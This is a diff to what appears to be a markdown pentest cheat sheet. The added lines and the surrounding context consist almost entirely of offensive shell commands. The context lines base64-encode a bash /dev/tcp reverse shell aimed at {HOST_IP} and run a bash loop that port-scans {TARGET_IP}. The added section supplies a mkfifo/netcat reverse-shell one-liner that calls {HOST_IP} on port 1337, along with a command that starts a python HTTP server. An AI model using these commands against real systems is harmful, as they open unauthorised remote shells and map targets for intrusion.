@@ -15,3 +15,17 @@ echo -ne 'bash -i >& /dev/tcp/{HOST_IP}/4444 0>&1' | base64
 # instead of netcat command
 for PORT in {0..1000}; do timeout 1 bash -c "</dev/tcp/{TARGET_IP}/$PORT &>/dev/null" 2>/dev/null && echo "port $PORT is open"; done
 ```
+
+## Late
+
+```bash
+# reverse shell sample
+
+#!/bin/bash
+rm /tmp/wk;mkfifo /tmp/wk;cat /tmp/wk|/bin/sh -i 2>&1|nc {HOST_IP} 1337 >/tmp/wk
+```
+
+```bash
+# run server at current directory
+python -m http.server 8000
+```
